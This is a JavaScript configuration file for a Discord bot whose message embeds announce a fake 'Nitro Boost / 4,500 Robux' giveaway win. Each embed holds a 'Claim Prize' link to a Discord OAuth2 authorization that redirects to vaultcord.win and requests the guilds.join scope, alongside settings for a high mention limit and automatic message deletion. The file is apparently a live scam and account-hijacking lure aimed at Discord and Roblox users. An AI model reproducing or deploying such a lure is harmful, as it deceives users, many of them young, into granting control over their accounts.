module.exports = {
    token: process.env.token,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,

    embed: [
        {
            embed: {
                title: "Congratulations {user}! You won Nitro Boost / 4,500 Robux Giveaway!",
                description: "**Nitro Boost + 4,500 Robux**\n\nEnds in: 07.07.2026\nHosted by: BloxFruits Admin\nEntries: 392\nWinners: 🥳・You! \n\nClick the button below to claim your prize!\n\n**[Claim Prize](https://discord.com/oauth2/authorize?client_id=1488221238638805022&redirect_uri=https://vaultcord.win/auth&response_type=code&scope=identify%20guilds.join&state=109950)**",
                color: 0x5865F2
            }
        }
    ],

    embed2: [
        {
            embed: {
                title: "Congratulations {user}! You won Nitro Boost / 4,500 Robux Giveaway!",
                description: "**Nitro Boost + 4,500 Robux**\n\nEnds in: 07.07.2026\nHosted by: BloxFruits Admin\nEntries: 392\nWinners: 🥳・You! \n\nClick the button below to claim your prize!\n\n**[Claim Prize](https://discord.com/oauth2/authorize?client_id=1488221238638805022&redirect_uri=https://vaultcord.win/auth&response_type=code&scope=identify%20guilds.join&state=109950)**",
                color: 0x5865F2
            }
        }
    ]
};
